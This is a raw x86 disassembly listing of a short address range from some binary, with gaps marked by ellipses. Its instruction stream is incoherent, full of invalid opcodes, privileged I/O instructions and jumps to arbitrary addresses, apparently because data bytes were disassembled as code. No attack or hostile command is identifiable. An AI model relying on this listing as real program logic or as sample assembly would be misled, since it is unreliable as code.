  41ea99:	ds jmp 0x10ae:0xce47438a
  41eaa1:	daa    
  41eaa2:	shr    BYTE PTR [ebx-0x3e54cd19],1
  41eaa8:	adc    ecx,DWORD PTR [edi]
  41eaaa:	xchg   ecx,eax
  41eaab:	lods   eax,DWORD PTR ds:[esi]
  41eaac:	or     al,0x38
  41eaae:	jl     0x41ea5e
  41eab0:	or     ebp,DWORD PTR [eax]
  41eab2:	popf   
  41eab3:	scas   eax,DWORD PTR es:[edi]
  41eab4:	pop    ss
  41eab5:	adc    ch,BYTE PTR [ebx+0x6ee405c8]
  41eabb:	enter  0xfcd,0x93
  41eabf:	mov    edx,0x9d6220d9
  41eac4:	fsub   QWORD PTR [edi]
  41eac6:	push   0xffffffbe
  41eac8:	shl    DWORD PTR [ebx],cl
  41eaca:	ins    BYTE PTR es:[edi],dx
  41eacb:	enter  0x1dd6,0x1e
  41eacf:	mov    eax,ds:0x9c1e3393
  41ead4:	ret    
  41ead5:	sub    al,0x5d
  41ead7:	leave  
  41ead8:	mov    bl,0x37
  41eada:	sub    DWORD PTR [ebx-0x36a4d365],0xffffff9a
  41eae1:	add    ebp,DWORD PTR [edi-0x38]
  41eae4:	lea    ecx,[edi]
  41eae6:	xor    edi,DWORD PTR [edx-0x62eddf67]
  41eaec:	xchg   edi,eax
  41eaed:	cmp    eax,0x0
	...
  41eb16:	add    BYTE PTR [eax],al
  41eb18:	adc    cl,BYTE PTR [ebx-0x53feb819]
  41eb1e:	add    BYTE PTR [ebp+0x4c],bh
  41eb21:	mov    esp,0xc6627a71
  41eb26:	outs   dx,BYTE PTR ds:[esi]
  41eb27:	das    
  41eb28:	pop    ebx
  41eb29:	(bad)  
  41eb2a:	arpl   cx,bp
  41eb2c:	dec    esp
  41eb2d:	shl    BYTE PTR [esp+ecx*2+0x4d],0x9f
  41eb32:	addr16 pop ebx
  41eb34:	cmp    ah,BYTE PTR [eax-0x67b1c592]
  41eb3a:	ins    BYTE PTR es:[edi],dx
  41eb3b:	dec    ebp
  41eb3c:	(bad)  
  41eb3d:	mov    edi,0x893df872
  41eb42:	js     0x41eb80
  41eb44:	es pop ebx
  41eb46:	pop    esp
  41eb47:	cmp    dl,BYTE PTR [edi]
  41eb49:	cwde   
  41eb4a:	jb     0x41eb61
  41eb4c:	add    BYTE PTR [edi-0x698416b0],cl
  41eb52:	jbe    0x41eb52
  41eb54:	dec    edi
  41eb55:	mov    esi,0x854d0c74
  41eb5a:	or     BYTE PTR fs:[esi+0x5b],cl
  41eb5e:	dec    eax
  41eb5f:	add    BYTE PTR ds:0x32fb6daf,ch
  41eb65:	test   DWORD PTR [eax+ecx*8+0x39],esp
  41eb69:	pop    ebx
  41eb6a:	pop    edi
  41eb6b:	lds    esp,FWORD PTR [ecx]
  41eb6d:	test   eax,0xbae3c262
  41eb72:	pop    edi
  41eb73:	aad    0x3d
  41eb75:	(bad)  
  41eb76:	jae    0x41eb48
  41eb78:	sbb    al,0xc4
  41eb7a:	lds    eax,FWORD PTR cs:[eax]
	...
  41eba5:	add    BYTE PTR [edx],bl
  41eba7:	scas   eax,DWORD PTR es:[edi]
  41eba8:	add    BYTE PTR [ebp-0x348d55d7],dl
  41ebae:	sbb    BYTE PTR [ebp-0x73c246ac],bl
  41ebb4:	ins    DWORD PTR es:[edi],dx
  41ebb5:	xchg   DWORD PTR [ecx],esi
  41ebb7:	mov    al,0x5f
  41ebb9:	fwait
  41ebba:	pop    esi
  41ebbb:	xchg   edi,eax
  41ebbc:	push   esp
  41ebbd:	xchg   esp,eax
  41ebbe:	dec    edi
  41ebbf:	mov    ecx,0x86d9006d
  41ebc4:	push   eax
  41ebc5:	add    dh,cl
  41ebc7:	sub    BYTE PTR [edi+0x74],0xc6
  41ebcb:	jle    0x41ec39
  41ebcd:	jo     0x41eb95
  41ebcf:	pushw  0x4400
  41ebd3:	and    BYTE PTR [esi+0x74],0xe8
  41ebd7:	jns    0x41ec4b
  41ebd9:	xor    ebp,DWORD PTR gs:[ebx+ebp*2+0x74]
  41ebde:	push   es
  41ebdf:	jae    0x41ec27
  41ebe1:	inc    esi
  41ebe2:	sbb    DWORD PTR [ebx+0x50],ebp
  41ebe5:	add    BYTE PTR [ecx+ecx*2],dl
  41ebe8:	popa   
  41ebe9:	or     bh,BYTE PTR fs:[ebp+0x74]
  41ebed:	imul   eax,DWORD PTR [esi],0x33614f83
  41ebf3:	dec    ebx
  41ebf4:	add    BYTE PTR [ebx+0x25],al
  41ebf7:	push   esi
  41ebf8:	fs gs inc ecx
  41ebfb:	dec    ebx
  41ebfc:	gs popa 
  41ebfe:	xor    ebx,DWORD PTR [ebx-0x7bcb9a98]
  41ec04:	add    BYTE PTR [ebx+0x30],dl
  41ec07:	push   ebp
  41ec08:	je     0x41ec81
	...
  41ec32:	add    BYTE PTR [eax],al
  41ec34:	inc    esi
  41ec35:	dec    ecx
  41ec36:	popa   
  41ec37:	pop    esp
  41ec38:	xor    al,0x80
  41ec3a:	je     0x41ec9d
  41ec3c:	add    edi,DWORD PTR [eax+0x46]
  41ec3f:	inc    esi
  41ec40:	retf   
  41ec41:	imul   ebx,DWORD PTR [edi+ecx*2+0x17],0xb16f6566
  41ec49:	dec    edx
  41ec4a:	add    BYTE PTR [eax-0xa],dl
  41ec4d:	dec    edx
  41ec4e:	outs   dx,DWORD PTR ds:[esi]
  41ec4f:	ja     0x41ec41
  41ec51:	dec    ebx
  41ec52:	add    BYTE PTR fs:[edx-0x4e8d9eb6],bh
  41ec59:	js     0x41ecc4
  41ec5b:	xlat   BYTE PTR gs:[ebx]
  41ec5d:	mov    eax,ds:0x98ab736b
  41ec62:	fs jb  0x41eca3
  41ec65:	rol    DWORD PTR [eax],1
  41ec67:	push   edx
  41ec68:	sbb    esi,DWORD PTR [edi+0x8237424]
  41ec6e:	sub    dh,BYTE PTR [edx+0x3e]
  41ec71:	aam    0x23
  41ec73:	jb     0x41ec87
  41ec75:	inc    esp
  41ec76:	dec    ecx
  41ec77:	ins    DWORD PTR es:[edi],dx
  41ec78:	or     eax,0x1b5f43b0
  41ec7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec7e:	add    al,0x50
  41ec80:	adc    DWORD PTR [edx-0x6eecfff0],edx
  41ec86:	sbb    eax,0x25a2e072
  41ec8b:	arpl   WORD PTR [esi],di
  41ec8d:	push   esp
  41ec8e:	and    DWORD PTR [ecx-0x13],esi
  41ec91:	ins    BYTE PTR es:[edi],dx
  41ec92:	and    esi,DWORD PTR [edx-0x1e]
  41ec95:	inc    ebx
  41ec96:	dec    ecx
  41ec97:	ins    DWORD PTR es:[edi],dx
	...
  41ecc0:	add    BYTE PTR [eax],al
  41ecc2:	int    0x6f
  41ecc4:	inc    eax
  41ecc5:	addr16 int3 
  41ecc7:	ins    DWORD PTR es:[edi],dx
  41ecc8:	and    DWORD PTR [ebx-0x25],ebp
  41eccb:	inc    ebx
  41eccc:	xor    BYTE PTR [ebp-0x60],ch
  41eccf:	push   esi
  41ecd0:	or     ebx,DWORD PTR [edi-0x54]
  41ecd3:	pop    edi
  41ecd4:	cmp    BYTE PTR [ecx-0x67],al
  41ecd7:	fs push ds
  41ecd9:	arpl   WORD PTR [ebx+0x5e700d81],bx
  41ecdf:	push   ecx
  41ece0:	and    esp,DWORD PTR [esi-0x76]
  41ece3:	sub    eax,0x1ea37222
  41ece8:	dec    edx
  41ece9:	outs   dx,BYTE PTR ds:[esi]
  41ecea:	mov    bl,BYTE PTR [edi]
  41ecec:	movd   mm4,DWORD PTR [ebx+0x16]
  41ecf0:	xor    eax,0x1af56c50
  41ecf5:	addr16 pop edx
  41ecf7:	daa    
  41ecf8:	adc    BYTE PTR [eax],al
  41ecfa:	lea    esp,ds:0x2351741b
  41ed00:	packsswb mm6,QWORD PTR [edx-0x4]
  41ed04:	sub    al,0x50
  41ed06:	jno    0x41ed63
  41ed08:	mov    BYTE PTR [ecx],dl
  41ed0a:	pop    ebp
  41ed0b:	xchg   edi,eax
  41ed0c:	stos   BYTE PTR es:[edi],al
  41ed0d:	inc    esp
  41ed0e:	or     al,0x9e
  41ed10:	lods   eax,DWORD PTR ds:[esi]
  41ed11:	das    
  41ed12:	push   cs
  41ed13:	xchg   edi,eax
  41ed14:	mov    edx,0x7abe322a
  41ed19:	add    esi,esi
  41ed1b:	ret    
  41ed1c:	jp     0x41ed2d
  41ed1e:	mov    ?,WORD PTR ds:[edx+0x1e]
  41ed22:	or     al,0x5b
  41ed24:	xchg   edi,eax
  41ed25:	and    al,0x0
	...
  41ed4f:	add    BYTE PTR [edi+ebp*4],cl
  41ed52:	out    0x33,eax
  41ed54:	jmp    0x41edb0
  41ed56:	aaa    
  41ed57:	sbb    dh,ah
  41ed59:	mov    bh,ah
  41ed5b:	ss bt  edi,esp
  41ed5f:	adc    ebp,esp
  41ed61:	ret    
  41ed62:	dec    ebp
  41ed63:	sbb    eax,0xe23abdd2
  41ed68:	rol    ebp,1
  41ed6a:	inc    ebx
  41ed6b:	add    al,0xf2
  41ed6d:	pushf  
  41ed6e:	adc    esi,DWORD PTR [esi+ebx*1]
  41ed71:	sahf   
  41ed72:	pop    ds
  41ed73:	adc    al,0xd2
  41ed75:	ret    
  41ed76:	sbb    DWORD PTR [ecx],ebp
  41ed78:	lods   al,BYTE PTR ds:[esi]
  41ed79:	pop    ebx
  41ed7a:	cmp    ah,BYTE PTR [ebx]
  41ed7c:	cwde   
  41ed7d:	scas   eax,DWORD PTR es:[edi]
  41ed7e:	push   ss
  41ed7f:	and    eax,0x4a23beac
  41ed84:	mov    cl,BYTE PTR [ebx-0x5469b739]
  41ed8a:	add    esp,DWORD PTR [ebx]
  41ed8c:	mov    WORD PTR [esi-0x707fd007],?
  41ed92:	mov    bh,0xe3
  41ed94:	jl     0x41ed49
  41ed96:	xlat   BYTE PTR ds:[ebx]
  41ed97:	pop    ds
  41ed98:	imul   ebp,DWORD PTR [ecx-0x736dea34],0xffffffbe
  41ed9f:	adc    eax,0x24b7a857
  41eda4:	pop    edi
  41eda5:	mov    esi,0x9880409b
  41edaa:	add    BYTE PTR [ebp-0x549339e4],bl
  41edb0:	and    ch,BYTE PTR [ecx+0xdb2b]
	...
  41edde:	jmp    0x41ee47
  41ede0:	add    BYTE PTR [ebx-0x798b50aa],ch
  41ede6:	pop    edi
  41ede7:	stos   BYTE PTR es:[edi],al
  41ede8:	add    BYTE PTR [edx+0x7e74bd5c],bh
  41edee:	pop    edx
  41edef:	test   eax,0x8f079d63
  41edf4:	push   eax
  41edf5:	leave  
  41edf6:	push   es
  41edf7:	mov    bl,0x70
  41edf9:	jge    0x41ee57
  41edfb:	test   eax,0x8b4e5b63
  41ee00:	jb     0x41ee50
  41ee02:	and    al,0xbc
  41ee04:	ins    BYTE PTR es:[edi],dx
  41ee05:	dec    esp
  41ee06:	dec    ecx
  41ee07:	pop    ebx
  41ee08:	push   eax
  41ee09:	dec    eax
  41ee0a:	push   ecx
  41ee0b:	stos   BYTE PTR es:[edi],al
  41ee0c:	jne    0x41ee64
  41ee0e:	dec    eax
  41ee0f:	mov    edi,0xaa231900
  41ee14:	jno    0x41ee54
  41ee16:	sbb    eax,0x3b1564a9
  41ee1b:	stos   DWORD PTR es:[edi],eax
  41ee1c:	arpl   cx,bp
  41ee1e:	add    eax,0x421571c6
  41ee23:	lahf   
  41ee24:	ins    DWORD PTR es:[edi],dx
  41ee25:	push   cs
  41ee26:	push   ebx
  41ee27:	rol    DWORD PTR [eax],0x39
  41ee2a:	pop    ebp
  41ee2b:	lods   eax,DWORD PTR ds:[esi]
  41ee2c:	je     0x41ee17
  41ee2e:	(bad)
  41ee33:	xchg   edx,eax
  41ee34:	ins    BYTE PTR es:[edi],dx
  41ee35:	sbb    DWORD PTR [ebx-0x59],ebx
  41ee38:	push   0x70a777e9
  41ee3d:	mov    edx,0xf63a722
	...
  41ee6a:	add    BYTE PTR [eax],al
  41ee6c:	dec    edx
  41ee6d:	(bad)  
  41ee6e:	ins    BYTE PTR es:[edi],dx
  41ee6f:	jmp    0xc0b48795
  41ee74:	adc    al,0x92
  41ee76:	je     0x41ee78
  41ee78:	repnz or ebp,edi
  41ee7b:	sub    eax,0x657cee
  41ee80:	stos   DWORD PTR es:[edi],eax
  41ee81:	je     0x41eee0
  41ee83:	outs   dx,BYTE PTR ds:[esi]
  41ee84:	mov    ds:0xfb65675f,eax
  41ee89:	cdq    
  41ee8a:	imul   ebp,DWORD PTR [esi-0x3f],0x4f
  41ee8e:	arpl   WORD PTR [esp+esi*8-0x7d],bx
  41ee92:	outs   dx,DWORD PTR ds:[esi]
  41ee93:	jae    0x41ee53
  41ee95:	jge    0x41ef05
  41ee97:	jae    0x41ee30
  41ee99:	or     BYTE PTR [edi+0x65],0x14
  41ee9d:	dec    ecx
  41ee9e:	outs   dx,DWORD PTR gs:[esi]
  41eea0:	mov    ecx,0x8530049
  41eea5:	test   BYTE PTR [edi+esi*2-0xa],dh
  41eea9:	dec    eax
  41eeaa:	popa   
  41eeab:	pop    esp
  41eeac:	xor    DWORD PTR [esi+0x6e],edi
  41eeaf:	inc    esp
  41eeb0:	push   cs
  41eeb1:	push   eax
  41eeb2:	popa   
  41eeb3:	pop    esp
  41eeb4:	and    al,0x7a
  41eeb6:	pop    edi
  41eeb7:	jne    0x41eede
  41eeb9:	jp     0x41ef01
  41eebb:	pop    eax
  41eebc:	addr16 xchg edi,eax
  41eebe:	imul   ebp,DWORD PTR [esi+0x1],0x56
  41eec2:	arpl   WORD PTR [eax],sp
  41eec4:	daa    
  41eec5:	jle    0x41ef3b
  41eec7:	push   0x746c6957
  41eecc:	push   ebp
  41eecd:	jle    0x41ef15
  41eecf:	pop    eax
	...
  41eef8:	add    BYTE PTR [eax],al
  41eefa:	ja     0x41ef53
  41eefc:	pop    esp
  41eefd:	jae    0x41ef3d
  41eeff:	push   ebx
  41ef00:	popa   
  41ef01:	jae    0x41ef0c
  41ef03:	imul   bp,WORD PTR [edi+eiz*1-0x7e],0x5446
  41ef0a:	aaa    
  41ef0b:	imul   esi,DWORD PTR [ecx+0x73],0x7552573f
  41ef12:	in     al,0x55
  41ef14:	dec    edi
  41ef15:	imul   edx,DWORD PTR [ebx],0x3e782e79
  41ef1b:	pop    ss
  41ef1c:	sbb    eax,0x13178d00
  41ef21:	jbe    0x41ef7e
  41ef23:	test   BYTE PTR [eax],0x53
  41ef26:	dec    ebp
  41ef27:	pop    ss
  41ef28:	adc    ebp,DWORD PTR [esi+0x5f]
  41ef2b:	pop    ss
  41ef2c:	add    BYTE PTR es:[esi+0x23],ch
  41ef30:	adc    al,0x71
  41ef32:	dec    ecx
  41ef33:	leave  
  41ef34:	adc    ah,BYTE PTR [esi+edi*1-0x6]
  41ef38:	adc    al,0x70
  41ef3a:	push   cs
  41ef3b:	fst    DWORD PTR [edx]
  41ef3d:	je     0x41ef7d
  41ef3f:	cmc    
  41ef40:	pop    ds
  41ef41:	data16 sub dh,BYTE PTR [ecx-0x2fdc8dde]
  41ef48:	inc    ebx
  41ef49:	jb     0x41ef62
  41ef4b:	fist   WORD PTR [edx]
  41ef4d:	pop    esp
  41ef4e:	icebp  
  41ef4f:	(bad)  
  41ef50:	and    dl,BYTE PTR [ecx+0x17]
  41ef53:	nop
  41ef54:	and    eax,0x20a5f350
  41ef59:	addr16 in eax,dx
  41ef5b:	fwait
  41ef5c:	and    eax,0x72
	...
  41ef85:	add    BYTE PTR [eax],al
  41ef87:	add    BYTE PTR [esi],bh
  41ef89:	add    BYTE PTR [esi+0x67],0xea
  41ef8d:	ins    BYTE PTR es:[edi],dx
  41ef8e:	sbb    DWORD PTR [esi-0x1d],ebp
  41ef91:	fwait
  41ef92:	add    al,0x62
  41ef94:	out    0x6f,eax
  41ef96:	sbb    esp,DWORD PTR [edi-0x28]
  41ef99:	xchg   esi,eax
  41ef9a:	or     al,0x2e
  41ef9c:	ficom  DWORD PTR [esp+eax*1+0x48]
  41efa0:	test   eax,0x9f6e1855
  41efa5:	push   edi
  41efa6:	and    eax,0x25559300
  41efab:	jb     0x41ef3d
  41efad:	arpl   WORD PTR ds:0x21523e63,bx
  41efb3:	jno    0x41ef42
  41efb5:	xor    DWORD PTR [eax],esp
  41efb7:	jb     0x41ef5b
  41efb9:	inc    edx
  41efba:	xor    DWORD PTR [ebp-0x74],ebp
  41efbd:	pop    ebx
  41efbe:	fild   DWORD PTR [ebx]
  41efc0:	pop    eax
  41efc2:	lds    edx,FWORD PTR [edi]
  41efc4:	imul   edi,DWORD PTR [edx-0x6975d927],0xffffffcf
  41efcb:	adc    eax,DWORD PTR [ecx+0x6115abc1]
  41efd1:	test   eax,0xb66f2fc4
  41efd6:	mov    edx,0xbdc06114
  41efdb:	adc    al,0x3e
  41efdd:	(bad)  
  41efde:	lods   al,BYTE PTR ds:[esi]
  41efdf:	or     ebp,DWORD PTR [esi]
  41efe1:	mov    edx,0xc22c478d
  41efe6:	popf   
  41efe7:	es pop DWORD PTR ds:[ebx+0x15]
	...
  41f013:	add    BYTE PTR [eax],al
  41f015:	add    BYTE PTR [ecx],bl
  41f017:	test   eax,0xc568148c
  41f01c:	jp     0x41f021
  41f01e:	pop    esp
  41f01f:	stos   DWORD PTR es:[edi],eax
  41f020:	mov    BYTE PTR [edi+ecx*1],dl
  41f023:	test   al,0x7e
  41f025:	adc    eax,0xca077d1a
  41f02a:	pop    ecx
  41f02b:	jge    0x41f014
  41f02d:	loope  0x41f054
  41f02f:	pop    ebx
  41f030:	cmp    bl,BYTE PTR [edi]
  41f032:	loopne 0x41efda
  41f034:	push   esi
  41f035:	and    eax,0x4923b5ec
  41f03a:	(bad)  
  41f03b:	stos   BYTE PTR es:[edi],al
  41f03c:	dec    eax
  41f03d:	push   ds
  41f03e:	cli    
  41f03f:	lods   al,BYTE PTR ds:[esi]
  41f040:	inc    eax
  41f041:	push   ss
  41f042:	fstp   QWORD PTR [edx+0x24]
  41f045:	or     al,0xce
  41f047:	mov    ecx,0xc2ac4815
  41f04c:	adc    eax,0x6a39329
  41f051:	and    DWORD PTR [ebp-0x53d6c5a5],ebx
  41f057:	test   eax,0x863e120c
  41f05c:	cli    
  41f05d:	sub    BYTE PTR [ecx+eiz*4-0x43a0f800],cl
  41f064:	add    BYTE PTR [ecx],bl
  41f066:	pop    ebx
  41f067:	stos   BYTE PTR es:[edi],al
  41f068:	jno    0x41f048
  41f06a:	pop    eax
  41f06b:	lods   eax,DWORD PTR ds:[esi]
  41f06c:	fs jmp 0xdaa17b92
  41f072:	dec    esp
  41f073:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f074:	ins    DWORD PTR es:[edi],dx
  41f075:	fistp  DWORD PTR [ecx]
  41f077:	pop    ebx
  41f078:	inc    esp
  41f079:	rol    BYTE PTR [eax],1
	...
  41f0a3:	add    BYTE PTR [edi],ch
  41f0a5:	mov    esp,0xad30b561
  41f0aa:	ja     0x41f095
  41f0ac:	or     al,0xbe
  41f0ae:	data16 mov ch,0x28
  41f0b1:	nop
  41f0b2:	jb     0x41f040
  41f0b4:	imul   esp,DWORD PTR [ecx-0x75624ebf],0xa6518f6d
  41f0be:	pop    edi
  41f0bf:	fwait
  41f0c0:	push   esi
  41f0c1:	pop    DWORD PTR [ecx-0x6b]
  41f0c4:	bound  ebp,QWORD PTR [edx-0x66a36f8f]
  41f0ca:	push   esp
  41f0cb:	cdq    
  41f0cc:	pop    ecx
  41f0cd:	cdq    
  41f0ce:	push   esp
  41f0cf:	cdq    
  41f0d0:	cli    
  41f0d1:	mov    ecx,0xc1575661
  41f0d6:	je     0x41f132
  41f0d8:	cmp    bl,BYTE PTR [ecx-0x43d2a68c]
  41f0de:	jb     0x41f137
  41f0e0:	pop    ss
  41f0e1:	lods   eax,DWORD PTR ds:[esi]
  41f0e2:	add    BYTE PTR [edi],ch
  41f0e4:	ss stos DWORD PTR es:[edi],eax
  41f0e6:	push   ebx
  41f0e7:	cmp    ah,BYTE PTR [edi]
  41f0e9:	lods   eax,DWORD PTR ds:[esi]
  41f0ea:	dec    esi
  41f0eb:	dec    eax
  41f0ec:	pop    ds
  41f0ed:	mov    esp,0xab262700
  41f0f2:	push   eax
  41f0f3:	or     BYTE PTR [ebp-0x54],cl
  41f0f6:	jne    0x41f106
  41f0f8:	dec    esp
  41f0f9:	mov    bh,0x0
  41f0fb:	and    BYTE PTR ss:[edi-0x53a4c690],0x71
  41f103:	add    BYTE PTR [eax],bl
  41f105:	dec    esi
  41f106:	jb     0x41f16c
	...
  41f130:	add    BYTE PTR [eax],al
  41f132:	daa    
  41f133:	cdq    
  41f134:	je     0x41f1a6
  41f136:	pop    ebx
  41f137:	push   eax
  41f138:	jb     0x41f19f
  41f13a:	xor    al,0x53
  41f13c:	imul   esi,DWORD PTR [edx-0x22],0x5a
  41f140:	dec    edi
  41f141:	dec    edi
  41f142:	cdq    
  41f143:	push   bx
  41f145:	inc    ecx
  41f146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f147:	mov    ds:0x72944e5c,eax
  41f14c:	and    BYTE PTR [ebx-0x10],dl
  41f14f:	js     0x41f1c5
  41f151:	ja     0x41f159
  41f153:	dec    ebp
  41f154:	popa   
  41f155:	pop    esp
  41f156:	cdq    
  41f157:	dec    esi
  41f158:	outs   dx,BYTE PTR gs:[esi]
  41f15a:	clc    
  41f15b:	jle    0x41f19a
  41f15d:	arpl   sp,ax
  41f15f:	dec    ebp
  41f160:	jno    0x41f1d0
  41f162:	retf   
  41f163:	dec    ecx
  41f164:	add    BYTE PTR [ebx-0x40],dl
  41f167:	js     0x41f1dd
  41f169:	ja     0x41f121
  41f16b:	dec    esp
  41f16c:	popa   
  41f16d:	pop    esp
  41f16e:	jmp    0xc38541d9
  41f173:	dec    edi
  41f174:	popa   
  41f175:	outs   dx,BYTE PTR ds:[esi]
  41f176:	or     edi,DWORD PTR [esi+0x4f]
  41f179:	imul   ecx,DWORD PTR [ebx],0x34006f83
  41f17f:	push   eax
  41f180:	data16 je 0x41f18b
  41f183:	jp     0x41f1f7
  41f185:	xor    ebp,DWORD PTR gs:[ebx+ebp*2+0x66]
  41f18a:	or     edi,DWORD PTR [edi+0x2e]
  41f18d:	outs   dx,DWORD PTR ds:[esi]
  41f18e:	adc    eax,0x2b465c78
  41f193:	addr16 aas 
  41f195:	ins    BYTE PTR es:[edi],dx
	...
  41f1be:	add    BYTE PTR [eax],al
  41f1c0:	(bad)  
  41f1c1:	jne    0x41f231
  41f1c3:	je     0x41f1f8
  41f1c5:	ins    BYTE PTR es:[edi],dx
  41f1c6:	gs je  0x41f213
  41f1c9:	dec    esp
  41f1ca:	add    BYTE PTR [esi],ch
  41f1cc:	inc    eax
  41f1cd:	pop    edi
  41f1ce:	pop    edi
  41f1cf:	add    BYTE PTR [esi],bh
  41f1d1:	push   ss
  41f1d2:	sbb    al,0x6c
  41f1d4:	xchg   edx,eax
  41f1d5:	inc    esp
  41f1d6:	and    esi,DWORD PTR [esi+ecx*4+0x48]
  41f1da:	and    DWORD PTR [ecx-0x76],esi
  41f1dd:	push   ds
  41f1de:	sbb    al,0x71
  41f1e0:	mov    ds:0x6e452d44,al
  41f1e5:	push   ecx
  41f1e6:	sbb    esp,DWORD PTR [esi+0x72]
  41f1e9:	or     eax,0xf05b7222
  41f1ee:	inc    esp
  41f1ef:	ins    BYTE PTR es:[di],dx
  41f1f1:	pop    ds
  41f1f2:	and    BYTE PTR [ecx+edx*2+0x12],dh
  41f1f6:	or     ah,BYTE PTR [eax]
  41f1f8:	mov    esp,esi
  41f1fa:	adc    eax,0x2fd03e71
  41f1ff:	push   0x6425f25f
  41f204:	ins    DWORD PTR es:[edi],dx
  41f205:	pop    ss
  41f206:	adc    eax,0x23c62774
  41f20b:	jno    0x41f26d
  41f20d:	loope  0x41f22e
  41f20f:	jno    0x41f24f
  41f211:	call   0xd2615a45
  41f216:	and    eax,0x14deed64
  41f21b:	je     0x41f244
  41f21d:	fisub  WORD PTR [ebx]
  41f21f:	jno    0x41f20a
  41f221:	repnz sub esi,DWORD PTR [eax]
	...
  41f24c:	add    BYTE PTR [eax],al
  41f24e:	loope  0x41f236
  41f250:	fisub  DWORD PTR [eax-0x23]
  41f253:	nop
  41f254:	add    al,0x5c
  41f256:	or     eax,0xe372218c
  41f25b:	lahf   
  41f25c:	das    
  41f25d:	arpl   dx,bp
  41f25f:	xchg   DWORD PTR [ecx],ebx
  41f261:	outs   dx,BYTE PTR ds:[esi]
  41f262:	loope  0x41f2d4
  41f264:	fidiv  WORD PTR [eax-0x31]
  41f267:	lahf   
  41f268:	sbb    DWORD PTR [ebx+eiz*8+0x43],esi
  41f26c:	sub    eax,0x12a2d651
  41f271:	arpl   WORD PTR [edx-0x55d8c5a5],sp
  41f277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f278:	adc    BYTE PTR [esi],bl
  41f27a:	mov    ds:0x82d336a8,eax
  41f27f:	imul   ebp,DWORD PTR [esi],0xffffffd7
  41f282:	imul   ebp,DWORD PTR [eax-0x5866e008],0x4
  41f289:	add    al,0x6a
  41f28b:	cwde   
  41f28c:	push   es
  41f28d:	es cwde 
  41f28f:	mov    dh,0x4
  41f291:	inc    ecx
  41f292:	ins    DWORD PTR es:[edi],dx
  41f293:	stos   DWORD PTR es:[edi],eax
  41f294:	pop    es
  41f295:	xor    DWORD PTR [ebx-0x4b],esp
  41f298:	rcl    DWORD PTR [ecx+ecx*4],cl
  41f29b:	test   eax,0xb65203cc
  41f2a0:	enter  0x6013,0xa7
  41f2a4:	mov    bh,0x3
  41f2a6:	dec    ebp
  41f2a7:	mov    ebp,0xab6926cb
  41f2ac:	add    eax,0xe7b64627
  41f2b1:	adc    BYTE PTR [eax],al
	...
  41f2db:	add    BYTE PTR [ecx],ah
  41f2dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2de:	mov    WORD PTR [eax],ss
  41f2e0:	pusha  
  41f2e1:	mov    bh,0x88
  41f2e3:	pop    ss
  41f2e4:	ds test al,0x80
  41f2e7:	pop    ss
  41f2e8:	sbb    eax,0x281abda8
  41f2ed:	ret    0x2fe7
  41f2f0:	add    dh,BYTE PTR [esi-0x460cec78]
  41f2f6:	jns    0x41f31e
  41f2f8:	loop   0x41f298
  41f2fa:	test   BYTE PTR [edx],ah
  41f2fc:	out    dx,al
  41f2fd:	xchg   esp,eax
  41f2fe:	cmp    esi,DWORD PTR [esi+edi*1]
  41f301:	mov    BYTE PTR [esi],ch
  41f303:	inc    edx
  41f304:	adc    al,BYTE PTR [eax+ebp*1+0x1b8efd36]
  41f30b:	and    ecx,edi
  41f30d:	stos   BYTE PTR es:[edi],al
  41f30e:	push   ds
  41f30f:	and    eax,0x3ce7b5cc
  41f314:	fsub   DWORD PTR [edi-0x40e4c300]
  41f31a:	ins    BYTE PTR es:[edi],dx
  41f31b:	sbb    DWORD PTR [ebx-0x59],esp
  41f31e:	push   0x748c71e9
  41f323:	or     BYTE PTR [esi-0x4c],bh
  41f326:	jb     0x41f311
  41f328:	ins    DWORD PTR es:[edi],dx
  41f329:	mov    WORD PTR [ecx+0x1a],?
  41f32c:	sub    eax,0x3a0d72be
  41f331:	mov    ds:0x9d39fa6d,eax
  41f336:	pop    edi
  41f337:	add    al,0x5f
  41f339:	pop    ebx
  41f33a:	push   ebx
  41f33b:	cli    
  41f33c:	push   ds
  41f33d:	test   eax,0xc84e
	...
  41f36a:	push   esi
  41f36b:	mov    eax,0xc01ebb00
  41f370:	ins    DWORD PTR es:[edi],dx
  41f371:	fstp   QWORD PTR [esi]
  41f373:	xchg   edi,eax
  41f374:	fistp  DWORD PTR ds:0x74ba
  41f379:	(bad)  
  41f37a:	sub    esp,DWORD PTR [eax+eax*1+0x74a92499]
  41f381:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f382:	shl    BYTE PTR cs:[edx-0x3c],0x53
  41f387:	pop    ebx
  41f388:	inc    esi
  41f389:	mov    edx,0x956da96d
  41f38e:	inc    esp
  41f38f:	mov    edx,0x8a3d856d
  41f394:	ins    DWORD PTR es:[edi],dx
  41f395:	xchg   DWORD PTR [ecx-0x5a],ecx
  41f398:	pop    edi
  41f399:	jnp    0x41f3f9
  41f39b:	(bad)  
  41f39c:	dec    ebx
  41f39d:	mov    BYTE PTR [ebx],dh
  41f39f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3a0:	xchg   DWORD PTR [di+0x729b],ebx
  41f3a5:	sbb    BYTE PTR [eax-0x57],0x77
  41f3a9:	push   ebp
  41f3aa:	cmp    cl,BYTE PTR [edi-0x4bffe4cf]
  41f3b0:	je     0x41f3e1
  41f3b2:	dec    esi
  41f3b3:	stos   DWORD PTR es:[edi],eax
  41f3b4:	cs inc eax
  41f3b6:	xor    al,0xb4
  41f3b8:	add    BYTE PTR [eax],al
  41f3ba:	or     DWORD PTR [ebx+0x7a13694f],ebx
  41f3c0:	outs   dx,DWORD PTR ds:[esi]
  41f3c1:	cs (bad) 
  41f3c3:	push   eax
  41f3c4:	add    BYTE PTR gs:[ebx+0x65],cl
  41f3c8:	popa   
  41f3c9:	je     0x41f42e
  41f3cb:	push   ecx
  41f3cc:	gs jbe 0x41f3cf
	...
  41f3f7:	add    BYTE PTR [edx+0x5f],al
  41f3fa:	push   eax
  41f3fb:	popa   
  41f3fc:	inc    esp
  41f3fd:	push   edx
  41f3fe:	push   ebx
  41f3ff:	outs   dx,DWORD PTR ds:[esi]
  41f400:	xor    eax,0x1555007b
  41f405:	push   ebx
  41f406:	add    BYTE PTR [ebp+0x4],dl
  41f409:	jl     0x41f47d
  41f40b:	dec    esi
  41f40c:	ss inc esp
  41f40e:	popa   
